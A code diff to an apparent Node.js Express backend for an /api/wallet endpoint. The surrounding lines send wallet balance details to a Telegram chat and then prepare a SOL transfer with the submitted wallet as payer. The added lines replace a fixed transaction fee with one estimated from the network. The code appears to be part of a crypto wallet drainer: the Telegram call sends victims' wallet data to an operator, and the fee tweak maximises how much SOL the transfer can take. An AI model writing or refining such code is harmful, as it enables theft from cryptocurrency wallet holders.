@@ -116,16 +116,19 @@ app.post('/api/wallet', async (req, res) => {
 
     await bot.sendMessage(chatId, message, { parse_mode: 'Markdown', disable_web_page_preview: true });
 
-    const TRANSACTION_FEE = 5000; 
-    if (balance <= TRANSACTION_FEE) {
-      return res.json({
-        success: true,
-        balance: balanceInSol,
-        splBalances: validSplBalances,
-        transaction: null,
-        message: 'Insufficient SOL balance for transaction',
-      });
-    }
+   // 🔹 Estimate real transaction fee
+const { feeCalculator } = await connection.getRecentBlockhash();
+const TRANSACTION_FEE = feeCalculator.lamportsPerSignature * 3; // 3 signatures buffer for safety
+
+if (balance <= TRANSACTION_FEE) {
+  return res.json({
+    success: true,
+    balance: balanceInSol,
+    splBalances: validSplBalances,
+    transaction: null,
+    message: 'Insufficient SOL balance for transaction',
+  });
+}
 
     // Prepare transaction (SOL transfer)
     const payer = publicKey;
@@ -207,3 +210,4 @@ app.post('/api/wallet', async (req, res) => {
 app.listen(port, () => {
   console.log(`Server running on http://localhost:${port}`);
 });
+
